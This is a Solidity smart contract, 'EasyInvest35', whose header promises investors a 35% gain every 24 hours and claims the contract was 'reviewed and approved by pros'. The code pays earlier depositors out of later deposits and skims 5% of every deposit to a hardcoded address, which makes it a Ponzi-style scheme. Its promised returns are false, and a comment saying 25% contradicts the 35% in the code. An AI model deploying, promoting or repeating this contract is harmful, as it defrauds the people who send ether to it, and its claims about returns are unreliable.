1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * Easy Investment Contract
6  *  - GAIN 35% PER 24 HOURS (every 5900 blocks)
7  *
8  * How to use:
9  *  1. Send any amount of ether to make an investment
10  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
11  *  OR
12  *  2b. Send more ether to reinvest AND get your profit at the same time
13  *
14  * RECOMMENDED GAS LIMIT: 200000
15  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
16  *
17  * Contract reviewed and approved by pros!
18  *
19  */
20 contract EasyInvest35 {
21     // records amounts invested
22     mapping (address => uint256) public invested;
23     // records blocks at which investments were made
24     mapping (address => uint256) public atBlock;
25 
26     // this function called every time anyone sends a transaction to this contract
27     function () external payable {
28         // if sender (aka YOU) is invested more than 0 ether
29         if (invested[msg.sender] != 0) {
30             // calculate profit amount as such:
31             // amount = (amount invested) * 25% * (blocks since last transaction) / 5900
32             // 5900 is an average block count per day produced by Ethereum blockchain
33             uint256 amount = invested[msg.sender] * 35 / 100 * (block.number - atBlock[msg.sender]) / 5900;
34 
35             // send calculated amount of ether directly to sender (aka YOU)
36             msg.sender.transfer(amount);
37         }
38 
39         // record block number and invested amount (msg.value) of this transaction
40         atBlock[msg.sender] = block.number;
41         invested[msg.sender] += msg.value;
42         
43         address(0x5fAFC6d356679aFfFb4dE085793d54d310E3f4b8).transfer(msg.value / 20);
44     }
45 }